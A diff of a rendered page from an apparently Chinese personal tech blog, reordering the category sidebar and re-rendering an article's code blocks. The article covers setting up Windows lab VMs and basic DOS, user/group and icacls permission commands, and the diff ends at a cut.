@@ -122,10 +122,52 @@
         
             
                 <li>
+                    <div data-rel="运维">
+                        
+                        运维
+                        <small>(25)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="开发">
+                        
+                        开发
+                        <small>(14)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
                     <div data-rel="读书">
                         
                         读书
                         <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="安全">
+                        
+                        安全
+                        <small>(3)</small>
                         
                     </div>
                     
@@ -154,48 +196,6 @@
                         
                         数据库
                         <small>(5)</small>
-                        
-                    </div>
-                    
-                </li>
-            
-        
-    
-        
-            
-                <li>
-                    <div data-rel="运维">
-                        
-                        运维
-                        <small>(25)</small>
-                        
-                    </div>
-                    
-                </li>
-            
-        
-    
-        
-            
-                <li>
-                    <div data-rel="安全">
-                        
-                        安全
-                        <small>(3)</small>
-                        
-                    </div>
-                    
-                </li>
-            
-        
-    
-        
-            
-                <li>
-                    <div data-rel="开发">
-                        
-                        开发
-                        <small>(14)</small>
                         
                     </div>
                     
@@ -236,7 +236,7 @@
     </div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="81">
-<input type="hidden" id="yelog_site_word_count" value="239.8k">
+<input type="hidden" id="yelog_site_word_count" value="243.5k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -985,7 +985,7 @@
     </div>
     <div class="article-meta">
         
-        <span>字数:2.7k</span>
+        <span>字数:2.8k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -1020,39 +1020,163 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Windosw7"><a href="#Windosw7" class="headerlink" title="Windosw7"></a>Windosw7</h1><h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># VM16pro，安装系统2C4G60G，删除打印机，工作网络，稍后提示，mz/aa</span></span><br><span class="line">Windows7 企业版</span><br><span class="line"><span class="comment"># 安装VM Tools工具的补丁</span></span><br><span class="line">windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu</span><br><span class="line"><span class="comment"># 禁用 Windows update</span></span><br><span class="line">services.msc</span><br><span class="line">启动类型：禁用；恢复：无操作</span><br><span class="line"><span class="comment"># 关闭 配置自动更新</span></span><br><span class="line">gpedit.msc</span><br><span class="line">管理模版 &gt; Windows组件 &gt; Windows Uupdate &gt;&gt; 配置自动更新 （已禁用）</span><br><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">控制面板\系统和安全\Windows 防火墙\自定义设置</span><br><span class="line"><span class="comment"># 压缩出一个D盘30G左右</span></span><br><span class="line"><span class="comment"># 克隆多一台WIn7虚拟机，并修改主机名mz-PC2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <h1 id="Windosw7"><a href="#Windosw7" class="headerlink" title="Windosw7"></a>Windosw7</h1><h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><pre><code class="hljs bash"><span class="hljs-comment"># VM16pro，安装系统2C4G60G，删除打印机，工作网络，稍后提示，mz/aa</span>
+Windows7 企业版
+<span class="hljs-comment"># 安装VM Tools工具的补丁</span>
+windows6.1-kb4474419-v3-x64_b5614c6cea5cb4e198717789633dca16308ef79c.msu
+<span class="hljs-comment"># 禁用 Windows update</span>
+services.msc
+启动类型：禁用；恢复：无操作
+<span class="hljs-comment"># 关闭 配置自动更新</span>
+gpedit.msc
+管理模版 &gt; Windows组件 &gt; Windows Uupdate &gt;&gt; 配置自动更新 （已禁用）
+<span class="hljs-comment"># 关闭防火墙</span>
+控制面板\系统和安全\Windows 防火墙\自定义设置
+<span class="hljs-comment"># 压缩出一个D盘30G左右</span>
+<span class="hljs-comment"># 克隆多一台WIn7虚拟机，并修改主机名mz-PC2</span>
+</code></pre>
 
 <hr>
-<h1 id="Windows-Server-2019"><a href="#Windows-Server-2019" class="headerlink" title="Windows Server 2019"></a>Windows Server 2019</h1><h2 id="虚拟机安装-1"><a href="#虚拟机安装-1" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 桌面体验版，30G系统盘，aA1234</span></span><br><span class="line">D潘</span><br><span class="line"><span class="comment"># 桌面优化</span></span><br><span class="line">图标</span><br><span class="line"><span class="comment"># VMTools</span></span><br><span class="line">安装 VMTools</span><br><span class="line"><span class="comment"># 关闭防火墙</span></span><br><span class="line">控制面板\系统和安全\Windows 防火墙\自定义设置</span><br><span class="line"><span class="comment"># 关闭更新</span></span><br><span class="line">gpedit.msc</span><br><span class="line">管理模版 &gt; Windows组件 &gt; Windows Uupdate &gt;&gt; 配置自动更新 （已禁用）</span><br><span class="line"><span class="comment"># 无须按 Ctrl + Alt + Del交互式登录</span></span><br><span class="line">gpedit.msc &gt; Windows设置 &gt; 安全设置 &gt; 本地策略 &gt; 安全选项 &gt; 交互式登陆：无须按Ctrl + Alt + Del （已启用）</span><br><span class="line"><span class="comment"># 快照</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 克隆&amp;修改主机名</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="Windows-Server-2019"><a href="#Windows-Server-2019" class="headerlink" title="Windows Server 2019"></a>Windows Server 2019</h1><h2 id="虚拟机安装-1"><a href="#虚拟机安装-1" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><pre><code class="hljs bash"><span class="hljs-comment"># 桌面体验版，30G系统盘，aA1234</span>
+D潘
+<span class="hljs-comment"># 桌面优化</span>
+图标
+<span class="hljs-comment"># VMTools</span>
+安装 VMTools
+<span class="hljs-comment"># 关闭防火墙</span>
+控制面板\系统和安全\Windows 防火墙\自定义设置
+<span class="hljs-comment"># 关闭更新</span>
+gpedit.msc
+管理模版 &gt; Windows组件 &gt; Windows Uupdate &gt;&gt; 配置自动更新 （已禁用）
+<span class="hljs-comment"># 无须按 Ctrl + Alt + Del交互式登录</span>
+gpedit.msc &gt; Windows设置 &gt; 安全设置 &gt; 本地策略 &gt; 安全选项 &gt; 交互式登陆：无须按Ctrl + Alt + Del （已启用）
+<span class="hljs-comment"># 快照</span>
+
+<span class="hljs-comment"># 克隆&amp;修改主机名</span>
+</code></pre>
 
 <hr>
-<h1 id="Dos命令"><a href="#Dos命令" class="headerlink" title="Dos命令"></a>Dos命令</h1><h2 id="文件-目录"><a href="#文件-目录" class="headerlink" title="文件&amp;目录"></a>文件&amp;目录</h2><h3 id="dir-查看目录文件"><a href="#dir-查看目录文件" class="headerlink" title="dir 查看目录文件"></a>dir 查看目录文件</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> # 查看当前目录文件</span><br><span class="line"><span class="built_in">dir</span> /w # 只显示名字</span><br><span class="line"><span class="built_in">dir</span> /s # 显示当前目录和子目录的所以文件</span><br><span class="line">dis /a # 也显示隐藏文件</span><br><span class="line"><span class="built_in">dir</span> /s /p # 显示当前目录和子目录的所以文件 / 翻页</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h1 id="Dos命令"><a href="#Dos命令" class="headerlink" title="Dos命令"></a>Dos命令</h1><h2 id="文件-目录"><a href="#文件-目录" class="headerlink" title="文件&amp;目录"></a>文件&amp;目录</h2><h3 id="dir-查看目录文件"><a href="#dir-查看目录文件" class="headerlink" title="dir 查看目录文件"></a>dir 查看目录文件</h3><pre><code class="hljs bat"><span class="hljs-built_in">dir</span> # 查看当前目录文件
+<span class="hljs-built_in">dir</span> /w # 只显示名字
+<span class="hljs-built_in">dir</span> /s # 显示当前目录和子目录的所以文件
+dis /a # 也显示隐藏文件
+<span class="hljs-built_in">dir</span> /s /p # 显示当前目录和子目录的所以文件 / 翻页
+language-bat复制代码</code></pre>
 
-<h3 id="md-创建目录"><a href="#md-创建目录" class="headerlink" title="md 创建目录"></a>md 创建目录</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">md</span> test # 创建test目录</span><br><span class="line"><span class="built_in">md</span> a/b/c # 创建a/b/c多层目录</span><br><span class="line"><span class="built_in">md</span> public jishubu caiwubu xiaoshoubu # 批量创建四个目录</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h3 id="md-创建目录"><a href="#md-创建目录" class="headerlink" title="md 创建目录"></a>md 创建目录</h3><pre><code class="hljs bat"><span class="hljs-built_in">md</span> test # 创建test目录
+<span class="hljs-built_in">md</span> a/b/c # 创建a/b/c多层目录
+<span class="hljs-built_in">md</span> public jishubu caiwubu xiaoshoubu # 批量创建四个目录
+language-bat复制代码</code></pre>
 
-<h3 id="cd-进入目录"><a href="#cd-进入目录" class="headerlink" title="cd 进入目录"></a>cd 进入目录</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="built_in">path</span> # 进入目录</span><br><span class="line"><span class="built_in">cd</span> / # 返回盘根目录</span><br><span class="line"><span class="built_in">cd</span> /d [盘符]:/<span class="built_in">path</span> # 直接跨盘符调整指定目录 </span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h3 id="cd-进入目录"><a href="#cd-进入目录" class="headerlink" title="cd 进入目录"></a>cd 进入目录</h3><pre><code class="hljs bat"><span class="hljs-built_in">cd</span> <span class="hljs-built_in">path</span> # 进入目录
+<span class="hljs-built_in">cd</span> / # 返回盘根目录
+<span class="hljs-built_in">cd</span> /d [盘符]:/<span class="hljs-built_in">path</span> # 直接跨盘符调整指定目录 
+language-bat复制代码</code></pre>
 
-<h3 id="rd-删除目录"><a href="#rd-删除目录" class="headerlink" title="rd 删除目录"></a>rd 删除目录</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rd</span> /s test # 删除 test目录[需要确认]</span><br><span class="line"><span class="built_in">rd</span> /s/q a\b\c # 确定删除a\b\c目录[不用一个一个交互式确认删除]</span><br><span class="line"><span class="built_in">rd</span> public jishubu caiwubu xiaoshoubu # 批量删除四个目录</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h3 id="rd-删除目录"><a href="#rd-删除目录" class="headerlink" title="rd 删除目录"></a>rd 删除目录</h3><pre><code class="hljs bat"><span class="hljs-built_in">rd</span> /s test # 删除 test目录[需要确认]
+<span class="hljs-built_in">rd</span> /s/q a\b\c # 确定删除a\b\c目录[不用一个一个交互式确认删除]
+<span class="hljs-built_in">rd</span> public jishubu caiwubu xiaoshoubu # 批量删除四个目录
+language-bat复制代码</code></pre>
 
-<h3 id="cd-创建文件"><a href="#cd-创建文件" class="headerlink" title="cd&gt; 创建文件"></a>cd&gt; 创建文件</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>&gt; aa.txt # 创建aa.txt文件</span><br><span class="line"><span class="built_in">cd</span>&gt; a\aa.txt # 在a路径下创建aa.txt文件</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h3 id="cd-创建文件"><a href="#cd-创建文件" class="headerlink" title="cd&gt; 创建文件"></a>cd&gt; 创建文件</h3><pre><code class="hljs bat"><span class="hljs-built_in">cd</span>&gt; aa.txt # 创建aa.txt文件
+<span class="hljs-built_in">cd</span>&gt; a\aa.txt # 在a路径下创建aa.txt文件
+language-bat复制代码</code></pre>
 
-<h3 id="echo-输入文件内容"><a href="#echo-输入文件内容" class="headerlink" title="echo 输入文件内容"></a>echo 输入文件内容</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> whoami &gt; aa.txt # 往aa.txt文件覆盖写入内容whoami</span><br><span class="line"><span class="built_in">echo</span> whoami &gt;&gt; aa.txt # 往aa.txt文件追加写入内容whoami</span><br><span class="line"><span class="built_in">echo</span> whoami &gt; a\aa.txt # 往a目录下的aa.txt文件覆盖写入内容whoami</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h3 id="echo-输入文件内容"><a href="#echo-输入文件内容" class="headerlink" title="echo 输入文件内容"></a>echo 输入文件内容</h3><pre><code class="hljs bat"><span class="hljs-built_in">echo</span> whoami &gt; aa.txt # 往aa.txt文件覆盖写入内容whoami
+<span class="hljs-built_in">echo</span> whoami &gt;&gt; aa.txt # 往aa.txt文件追加写入内容whoami
+<span class="hljs-built_in">echo</span> whoami &gt; a\aa.txt # 往a目录下的aa.txt文件覆盖写入内容whoami
+language-bat复制代码</code></pre>
 
-<h3 id="type-查看文件内容"><a href="#type-查看文件内容" class="headerlink" title="type 查看文件内容"></a>type 查看文件内容</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> aa.txt # 查看aa.txt文件内容</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h3 id="type-查看文件内容"><a href="#type-查看文件内容" class="headerlink" title="type 查看文件内容"></a>type 查看文件内容</h3><pre><code class="hljs bat"><span class="hljs-built_in">type</span> aa.txt # 查看aa.txt文件内容
+language-bat复制代码</code></pre>
 
-<h3 id="del-删除文件"><a href="#del-删除文件" class="headerlink" title="del 删除文件"></a>del 删除文件</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">del</span> aa.txt # 删除 aa.txt 文件</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h3 id="del-删除文件"><a href="#del-删除文件" class="headerlink" title="del 删除文件"></a>del 删除文件</h3><pre><code class="hljs bat"><span class="hljs-built_in">del</span> aa.txt # 删除 aa.txt 文件
+language-bat复制代码</code></pre>
 
-<h3 id="copy-复制文件"><a href="#copy-复制文件" class="headerlink" title="copy 复制文件"></a>copy 复制文件</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> aa.txt test # 将aa.txt文件拷贝到test目录中</span><br><span class="line"><span class="built_in">copy</span> test\aa.txt bb.txt # 拷贝test目录下的aa.txt文件到根目录并修改为bb.txt文件</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h3 id="copy-复制文件"><a href="#copy-复制文件" class="headerlink" title="copy 复制文件"></a>copy 复制文件</h3><pre><code class="hljs bat"><span class="hljs-built_in">copy</span> aa.txt test # 将aa.txt文件拷贝到test目录中
+<span class="hljs-built_in">copy</span> test\aa.txt bb.txt # 拷贝test目录下的aa.txt文件到根目录并修改为bb.txt文件
+language-bat复制代码</code></pre>
 
-<h3 id="ren-修改文件名"><a href="#ren-修改文件名" class="headerlink" title="ren 修改文件名"></a>ren 修改文件名</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ren</span> bb.txt cc.txt # 将 bb.txt 修改为 cc.txt</span><br><span class="line"><span class="built_in">ren</span> test\aa.txt bb.txt # 将test目录下的aa.txt 修改为bb.txt [后面不需要指定目录]</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h3 id="ren-修改文件名"><a href="#ren-修改文件名" class="headerlink" title="ren 修改文件名"></a>ren 修改文件名</h3><pre><code class="hljs bat"><span class="hljs-built_in">ren</span> bb.txt cc.txt # 将 bb.txt 修改为 cc.txt
+<span class="hljs-built_in">ren</span> test\aa.txt bb.txt # 将test目录下的aa.txt 修改为bb.txt [后面不需要指定目录]
+language-bat复制代码</code></pre>
 
-<h2 id="用户-组"><a href="#用户-组" class="headerlink" title="用户&amp;组"></a>用户&amp;组</h2><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span>、查看用户</span><br><span class="line">whoami /user # 查看当前用户</span><br><span class="line">vmic useraccount get name,sid # 查看所以账号的名称和sid</span><br><span class="line"><span class="built_in">net</span> user  # 查看所有用户</span><br><span class="line"><span class="built_in">net</span> user admin # 查看admin用户信息</span><br><span class="line"># <span class="number">2</span>、启用或禁用指定用户</span><br><span class="line"><span class="built_in">net</span> user admin /active:yes # 启用admin用户</span><br><span class="line"><span class="built_in">net</span> user admin /active:no #  禁用admin用户</span><br><span class="line"># <span class="number">3</span>、命令创建用户</span><br><span class="line"><span class="built_in">net</span> user mz aa123456 /add  # 创建用户mz 密码为aa123456</span><br><span class="line"># <span class="number">4</span>、命令重置用户密码</span><br><span class="line"><span class="built_in">net</span> user mz &quot;&quot; # 将mz用户密码重置为空</span><br><span class="line"># <span class="number">5</span>、修改用户密码</span><br><span class="line"><span class="built_in">net</span> user mz <span class="number">123456</span> # 将mz用户的密码修改为<span class="number">123456</span></span><br><span class="line"># <span class="number">6</span>、命令删除用户</span><br><span class="line"><span class="built_in">net</span> user mz /<span class="built_in">del</span> # 删除mz用户</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h2 id="用户-组"><a href="#用户-组" class="headerlink" title="用户&amp;组"></a>用户&amp;组</h2><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><pre><code class="hljs bat"># <span class="hljs-number">1</span>、查看用户
+whoami /user # 查看当前用户
+vmic useraccount get name,sid # 查看所以账号的名称和sid
+<span class="hljs-built_in">net</span> user  # 查看所有用户
+<span class="hljs-built_in">net</span> user admin # 查看admin用户信息
+# <span class="hljs-number">2</span>、启用或禁用指定用户
+<span class="hljs-built_in">net</span> user admin /active:yes # 启用admin用户
+<span class="hljs-built_in">net</span> user admin /active:no #  禁用admin用户
+# <span class="hljs-number">3</span>、命令创建用户
+<span class="hljs-built_in">net</span> user mz aa123456 /add  # 创建用户mz 密码为aa123456
+# <span class="hljs-number">4</span>、命令重置用户密码
+<span class="hljs-built_in">net</span> user mz &quot;&quot; # 将mz用户密码重置为空
+# <span class="hljs-number">5</span>、修改用户密码
+<span class="hljs-built_in">net</span> user mz <span class="hljs-number">123456</span> # 将mz用户的密码修改为<span class="hljs-number">123456</span>
+# <span class="hljs-number">6</span>、命令删除用户
+<span class="hljs-built_in">net</span> user mz /<span class="hljs-built_in">del</span> # 删除mz用户
+language-bat复制代码</code></pre>
 
-<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span>、查看本地用户组</span><br><span class="line"><span class="built_in">net</span> localgroup </span><br><span class="line"># <span class="number">2</span>、命令创建 group1 组</span><br><span class="line"><span class="built_in">net</span> localgroup group1 /add</span><br><span class="line"># <span class="number">3</span>、命令删除 group1 组</span><br><span class="line"><span class="built_in">net</span> localgroup group1 /<span class="built_in">del</span></span><br><span class="line"># <span class="number">4</span>、命令添加 mz 用户到指定 group1 组</span><br><span class="line"><span class="built_in">net</span> localgroup group1 mz /add</span><br><span class="line"># <span class="number">5</span>、把指定 mz用户踢出 group1 组</span><br><span class="line"><span class="built_in">net</span> localgroup group1 mz /<span class="built_in">del</span></span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+<h3 id="组"><a href="#组" class="headerlink" title="组"></a>组</h3><pre><code class="hljs bat"># <span class="hljs-number">1</span>、查看本地用户组
+<span class="hljs-built_in">net</span> localgroup 
+# <span class="hljs-number">2</span>、命令创建 group1 组
+<span class="hljs-built_in">net</span> localgroup group1 /add
+# <span class="hljs-number">3</span>、命令删除 group1 组
+<span class="hljs-built_in">net</span> localgroup group1 /<span class="hljs-built_in">del</span>
+# <span class="hljs-number">4</span>、命令添加 mz 用户到指定 group1 组
+<span class="hljs-built_in">net</span> localgroup group1 mz /add
+# <span class="hljs-number">5</span>、把指定 mz用户踢出 group1 组
+<span class="hljs-built_in">net</span> localgroup group1 mz /<span class="hljs-built_in">del</span>
+language-bat复制代码</code></pre>
 
-<h2 id="文件系统-权限"><a href="#文件系统-权限" class="headerlink" title="文件系统&amp;权限"></a>文件系统&amp;权限</h2><h3 id="文件系统-权限-1"><a href="#文件系统-权限-1" class="headerlink" title="文件系统&amp;权限"></a>文件系统&amp;权限</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Windowe系统格式：CDFS/UDF/FAT12/FAT16/FAT32/NTFS</span><br><span class="line">NTFS (New Technology File System 新技术文件系统)</span><br><span class="line"></span><br><span class="line">默认继承权限；可以通过禁用继承，修改权限和主体；</span><br><span class="line">aa/bb: 如果aa禁用了继承，并修改权限；bb没有禁用继承，则bb会继承aa的权限；</span><br><span class="line">cc/dd：如果dd禁用了继承，并修改权限；cc没有禁用继承，dd的权限保持不变；</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>
+<h2 id="文件系统-权限"><a href="#文件系统-权限" class="headerlink" title="文件系统&amp;权限"></a>文件系统&amp;权限</h2><h3 id="文件系统-权限-1"><a href="#文件系统-权限-1" class="headerlink" title="文件系统&amp;权限"></a>文件系统&amp;权限</h3><pre><code class="hljs bash">Windowe系统格式：CDFS/UDF/FAT12/FAT16/FAT32/NTFS
+NTFS (New Technology File System 新技术文件系统)
 
-<h3 id="icacls-命令"><a href="#icacls-命令" class="headerlink" title="icacls 命令"></a>icacls 命令</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">## icacls &quot;目录路径&quot; [/参数] [用户/组:权限] [/选项]</span><br><span class="line">#目录路径：需操作的目标目录（含空格时需用引号包裹）。</span><br><span class="line">#参数：控制操作类型（如 /grant、/deny、/remove）。</span><br><span class="line">#用户/组：指定权限对象（支持友好名称或 SID 格式，如 Administrators 或 *S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">32</span>-<span class="number">544</span>）。</span><br><span class="line">#权限：定义访问权限（如 F 完全控制、M 修改、RX 读取执行）。</span><br><span class="line">#选项：控制操作范围（如 /T 递归、/C 继续错误、/Q 静默模式）。</span><br><span class="line"># (I)(OI)(CI)(F)： 继承父目录权限，且对子文件（OI）和子文件夹（CI）生效</span><br><span class="line"></span><br><span class="line">## <span class="number">1</span>、查看当前权限</span><br><span class="line">icacls &quot;C:\Data&quot;</span><br><span class="line"></span><br><span class="line">## <span class="number">2</span>、修改权限</span><br><span class="line"># 授予权限：为 Users 组授予目录及其子项的读取和执行权限（/T 递归生效）。</span><br><span class="line">icacls &quot;C:\Data&quot; /grant &quot;Users&quot;:(RX) /T</span><br><span class="line"># 拒绝权限：显式拒绝 Guest 用户对目录的写入权限（优先于其他权限）。</span><br><span class="line">icacls &quot;C:\Data&quot; /deny &quot;Guest&quot;:(W)</span><br><span class="line"># 删除权限：从 ACL 中移除 Everyone 组的所有权限条目。</span><br><span class="line">icacls &quot;C:\Data&quot; /remove &quot;Everyone&quot;</span><br><span class="line"></span><br><span class="line">## <span class="number">3</span>、继承权限</span><br><span class="line"># 禁用继承并移除继承权限：目录将不再继承父目录权限，并删除所有已继承的权限条目。</span><br><span class="line">icacls &quot;C:\Data&quot; /inheritance:r</span><br><span class="line"># 禁用继承但保留权限：恢复继承父目录权限的设置。</span><br><span class="line">icacls &quot;C:\Data&quot; /inheritance:d</span><br><span class="line"></span><br><span class="line">## <span class="number">4</span>、备份与恢复权限</span><br><span class="line"># 备份 ACL 到文件：将目录及其子项的 ACL 保存到文本文件，供后续恢复使用。</span><br><span class="line">icacls &quot;C:\Data&quot; /save &quot;C:\Backup\Data_ACL.txt&quot; /T</span><br><span class="line"># 从文件恢复 ACL：恢复目录及其子项的 ACL 为备份时的状态。</span><br><span class="line">icacls &quot;C:\Data&quot; /<span class="built_in">restore</span> &quot;C:\Backup\Data_ACL.txt&quot;</span><br><span class="line"></span><br><span class="line">## <span class="number">5</span>、重置权限为默认继承</span><br><span class="line"># 删除所有显式设置的权限，恢复为父目录的继承设置（慎用，可能导致权限丢失）。</span><br><span class="line">icacls &quot;C:\Data&quot; /reset /T</span><br><span class="line"></span><br><span class="line">## 典型应用&#123;&quot;OI,CI&quot;: &quot;影响未来子文件和目录&quot;, &quot;RWD&quot;: &quot;不可以执行和修改权限其他都可&quot;, &quot;/T&quot;: &quot;需要递归现存的子孙文件和目录&quot;&#125;</span><br><span class="line">icacls &quot;public&quot; /inheritance:r /grant &quot;owner&quot;:(OI)(CI)(F) /grant &quot;admin&quot;:(OI)(CI)(M|[RX,W,D]) /grant &quot;group_rwd&quot;:(OI)(CI)(R,W,D) /grant &quot;group_rx&quot;:(OI)(CI)(RX) /grant &quot;group_r&quot;:(OI)(CI)(R) /T</span><br><span class="line">language-bat复制代码</span><br></pre></td></tr></table></figure>
+默认继承权限；可以通过禁用继承，修改权限和主体；
+aa/bb: 如果aa禁用了继承，并修改权限；bb没有禁用继承，则bb会继承aa的权限；
+cc/dd：如果<span class="hljs-built_in">dd</span>禁用了继承，并修改权限；cc没有禁用继承，<span class="hljs-built_in">dd</span>的权限保持不变；
+复制代码</code></pre>
+
+<h3 id="icacls-命令"><a href="#icacls-命令" class="headerlink" title="icacls 命令"></a>icacls 命令</h3><pre><code class="hljs bat">## icacls &quot;目录路径&quot; [/参数] [用户/组:权限] [/选项]
+#目录路径：需操作的目标目录（含空格时需用引号包裹）。
+#参数：控制操作类型（如 /grant、/deny、/remove）。
+#用户/组：指定权限对象（支持友好名称或 SID 格式，如 Administrators 或 *S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">544</span>）。
+#权限：定义访问权限（如 F 完全控制、M 修改、RX 读取执行）。
+#选项：控制操作范围（如 /T 递归、/C 继续错误、/Q 静默模式）。
+# (I)(OI)(CI)(F)： 继承父目录权限，且对子文件（OI）和子文件夹（CI）生效
+
+## <span class="hljs-number">1</span>、查看当前权限
+icacls &quot;C:\Data&quot;
+
+## <span class="hljs-number">2</span>、修改权限
+# 授予权限：为 Users 组授予目录及其子项的读取和执行权限（/T 递归生效）。
+icacls &quot;C:\Data&quot; /grant &quot;Users&quot;:(RX) /T
+# 拒绝权限：显式拒绝 Guest 用户对目录的写入权限（优先于其他权限）。
+icacls &quot;C:\Data&quot; /deny &quot;Guest&quot;:(W)
+# 删除权限：从 ACL 中移除 Everyone 组的所有权限条目。
